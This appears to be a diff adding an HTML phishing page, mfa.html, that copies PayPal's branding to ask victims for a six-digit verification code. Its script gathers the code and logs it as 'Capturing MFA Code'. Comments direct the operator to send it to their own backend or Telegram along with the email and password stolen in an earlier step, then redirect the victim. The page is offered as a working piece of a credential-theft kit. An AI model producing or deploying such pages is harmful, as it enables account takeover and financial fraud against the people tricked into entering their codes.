@@ -1,0 +1,80 @@
+<!-- mfa.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification | PayPal</title>
+    <style>
+        body { font-family: sans-serif; background: #f4f7f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { width: 100%; max-width: 400px; padding: 30px; background: #fff; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; }
+        .logo { width: 50px; margin-bottom: 20px; }
+        h1 { font-size: 22px; color: #333; margin-bottom: 10px; }
+        p { color: #666; font-size: 14px; margin-bottom: 25px; line-height: 1.4; }
+        
+        /* The 6-digit code input style */
+        .code-input { 
+            display: flex; justify-content: center; gap: 10px; margin-bottom: 25px; 
+        }
+        .code-input input { 
+            width: 45px; height: 50px; text-align: center; font-size: 24px; 
+            border: 2px solid #ddd; border-radius: 8px; outline: none; 
+        }
+        .code-input input:focus { border-color: #0070ba; }
+
+        .btn { width: 100%; padding: 15px; background: #0070ba; color: white; border: none; border-radius: 25px; font-weight: bold; font-size: 16px; cursor: pointer; }
+        .btn:hover { background: #005ea6; }
+        
+        .footer-link { margin-top: 20px; font-size: 13px; color: #0070ba; text-decoration: none; display: block; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSm7KY6cxjGvvYvQKwl2pCyYXYjTFWhPU3jbmQfcN9k9aUC3coIkPOrR4FD&s=10" class="logo" alt="PayPal">
+        <h1>Verify your identity</h1>
+        <p>We've sent a 6-digit code to your registered device. Enter it below to secure your account.</p>
+
+        <form id="mfaForm">
+            <div class="code-input">
+                <input type de="text" maxlength="1" class="digit" required>
+                <input type="text" maxlength="1" class="digit" required>
+                <input type="text" maxlength="1" class="digit" required>
+                <input type="text" maxlength="1" class="digit" required>
+                <input type="text" maxlength="1" class="digit" required>
+                <input type="text" maxlength="1" class="digit" required>
+            </div>
+            <button type="submit" class="btn">Verify Account</button>
+        </form>
+
+        <a href="#" class="footer-link">Didn't receive a code? Resend</a>
+    </div>
+
+    <script>
+        // Auto-focus next input for better UX
+        const inputs = document.querySelectorAll('.digit');
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', () => {
+                if (input.value.length === 1 && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+            });
+        });
+
+        // Handle MFA Submission
+        document.getElementById('mfaForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            let code = "";
+            inputs.forEach(input => { code += input.value; });
+
+            console.log("Capturing MFA Code:", code);
+
+            // 1. SEND CODE TO YOUR BACKEND/TELEGRAM
+            // You would send this along with the email/password from the first step
+            alert("Verification in progress. Please wait...");
+
+            // 2. REDIRECT TO SUCCESS/ERROR PAGE
+            // window.location.href = 'success.html';
+        });
+    </script>
+</body>
+</html>
